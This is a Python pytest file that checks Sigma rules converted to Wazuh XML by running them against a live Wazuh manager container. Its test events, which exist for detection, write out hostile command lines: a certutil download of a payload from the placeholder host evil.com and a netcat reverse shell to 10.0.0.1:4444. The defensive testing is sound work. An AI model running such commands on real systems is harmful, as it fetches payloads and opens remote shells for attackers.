"""Live-fire integration tests validating converted rules against a real Wazuh Manager container."""

import json
import shutil
import subprocess
import pytest

from sigma.collection import SigmaCollection
from sigma.backends.wazuh import WazuhBackend
from sigma.backends.wazuh.models import WazuhGroup
from sigma.pipelines.wazuh import (
    wazuh_windows_pipeline,
    wazuh_linux_pipeline,
    wazuh_web_pipeline,
)

BASE_RULES = """
<group name="sysmon_base,">
  <rule id="100000" level="0">
    <if_sid>60000</if_sid>
    <field name="win.system.eventID" type="pcre2">^1$|^4688$</field>
    <description>Windows Sysmon EID 1 / 4688 Base Event</description>
    <group>sysmon_event1,</group>
  </rule>
</group>
<group name="audit_base,">
  <rule id="100001" level="0">
    <field name="audit.type" type="pcre2">^EXECVE$|^SYSCALL$</field>
    <description>Linux Auditd Execve Base Event</description>
    <group>audit_execve,</group>
  </rule>
</group>
<group name="web_base,">
  <rule id="100002" level="0">
    <if_sid>31100,31108</if_sid>
    <description>Web Access Log Base Event</description>
    <group>web_access,</group>
  </rule>
</group>
"""


def is_wazuh_container_running() -> bool:
    """Check if the wazuh-manager container is running in podman or docker."""
    runtime = shutil.which("podman") or shutil.which("docker")
    if not runtime:
        return False
    try:
        res = subprocess.run(
            [runtime, "ps", "--filter", "name=wazuh-manager", "--format", "{{.Names}}"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        return "wazuh-manager" in res.stdout
    except Exception:
        return False


pytestmark = pytest.mark.skipif(
    not is_wazuh_container_running(),
    reason="wazuh-manager container is not running",
)


def load_rules_into_container(rule_xml_content: str) -> bool:
    """Load XML rules into the wazuh-manager container and validate syntax."""
    runtime = shutil.which("podman") or shutil.which("docker")
    full_xml = f"{BASE_RULES}\n<group name=\"sigma_test,\">\n{rule_xml_content}\n</group>"
    try:
        write_proc = subprocess.run(
            [runtime, "exec", "-i", "wazuh-manager", "sh", "-c", "cat > /var/ossec/etc/rules/local_rules.xml"],
            input=full_xml,
            text=True,
            capture_output=True,
            timeout=10,
        )
        if write_proc.returncode != 0:
            return False

        check_proc = subprocess.run(
            [runtime, "exec", "wazuh-manager", "/var/ossec/bin/wazuh-analysisd", "-t"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return check_proc.returncode == 0
    except Exception:
        return False


def test_live_wazuh_windows_execution():
    backend = WazuhBackend(processing_pipeline=wazuh_windows_pipeline())
    yaml_text = """
    title: Certutil Download Detection
    id: 11111111-2222-3333-4444-555555555555
    logsource:
        category: process_creation
        product: windows
    detection:
        sel:
            Image|endswith: '\\certutil.exe'
            CommandLine|contains|all:
                - '-urlcache'
                - '-split'
        condition: sel
    level: high
    """
    rule = SigmaCollection.from_yaml(yaml_text).rules[0]
    w_rules = backend.convert_rule(rule)
    assert len(w_rules) == 1
    rule_xml = w_rules[0].to_xml()

    # Load base rules + test rule into manager
    assert load_rules_into_container(rule_xml)

    runtime = shutil.which("podman") or shutil.which("docker")

    # Positive event
    positive_event = json.dumps({
        "win": {
            "system": {"eventID": "1", "providerName": "Microsoft-Windows-Sysmon"},
            "eventdata": {
                "image": "C:\\Windows\\System32\\certutil.exe",
                "commandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
            },
        }
    })

    logtest_pos = subprocess.run(
        [runtime, "exec", "-i", "wazuh-manager", "/var/ossec/bin/wazuh-logtest"],
        input=positive_event + "\n",
        text=True,
        capture_output=True,
        timeout=10,
    )
    output = logtest_pos.stdout + logtest_pos.stderr
    assert f"id: '{w_rules[0].id}'" in output
    assert "**Alert to be generated." in output

    # Negative event (clean certutil invocation without urlcache)
    negative_event = json.dumps({
        "win": {
            "system": {"eventID": "1", "providerName": "Microsoft-Windows-Sysmon"},
            "eventdata": {
                "image": "C:\\Windows\\System32\\certutil.exe",
                "commandLine": "certutil.exe -dump",
            },
        }
    })

    logtest_neg = subprocess.run(
        [runtime, "exec", "-i", "wazuh-manager", "/var/ossec/bin/wazuh-logtest"],
        input=negative_event + "\n",
        text=True,
        capture_output=True,
        timeout=10,
    )
    output_neg = logtest_neg.stdout + logtest_neg.stderr
    assert f"id: '{w_rules[0].id}'" not in output_neg


def test_live_wazuh_linux_execution():
    backend = WazuhBackend(processing_pipeline=wazuh_linux_pipeline())
    yaml_text = """
    title: Linux Netcat Reverse Shell
    id: 22222222-3333-4444-5555-666666666666
    logsource:
        category: process_creation
        product: linux
    detection:
        sel:
            Image|endswith: '/nc'
            CommandLine|contains: ' -e '
        condition: sel
    level: high
    """
    rule = SigmaCollection.from_yaml(yaml_text).rules[0]
    w_rules = backend.convert_rule(rule)
    assert len(w_rules) == 1
    rule_xml = w_rules[0].to_xml()

    assert load_rules_into_container(rule_xml)

    runtime = shutil.which("podman") or shutil.which("docker")

    positive_event = json.dumps({
        "audit": {
            "type": "EXECVE",
            "exe": "/bin/nc",
            "command": "nc -e /bin/sh 10.0.0.1 4444",
        }
    })

    logtest_pos = subprocess.run(
        [runtime, "exec", "-i", "wazuh-manager", "/var/ossec/bin/wazuh-logtest"],
        input=positive_event + "\n",
        text=True,
        capture_output=True,
        timeout=10,
    )
    output = logtest_pos.stdout + logtest_pos.stderr
    assert f"id: '{w_rules[0].id}'" in output
    assert "**Alert to be generated." in output


def test_live_wazuh_web_execution():
    backend = WazuhBackend(processing_pipeline=wazuh_web_pipeline())
    yaml_text = """
    title: Web Shell Access Detection
    id: 33333333-4444-5555-6666-777777777777
    logsource:
        category: webserver
    detection:
        sel:
            c-uri|endswith: '/shell.php'
            cs-method: 'GET'
        condition: sel
    level: high
    """
    rule = SigmaCollection.from_yaml(yaml_text).rules[0]
    w_rules = backend.convert_rule(rule)
    assert len(w_rules) == 1
    rule_xml = w_rules[0].to_xml()

    assert load_rules_into_container(rule_xml)

    runtime = shutil.which("podman") or shutil.which("docker")
    apache_log = '192.168.1.100 - - [24/Oct/2026:12:00:00 +0000] "GET /shell.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"\n'

    logtest_pos = subprocess.run(
        [runtime, "exec", "-i", "wazuh-manager", "/var/ossec/bin/wazuh-logtest"],
        input=apache_log,
        text=True,
        capture_output=True,
        timeout=10,
    )
    output = logtest_pos.stdout + logtest_pos.stderr
    assert f"id: '{w_rules[0].id}'" in output
    assert "**Alert to be generated." in output

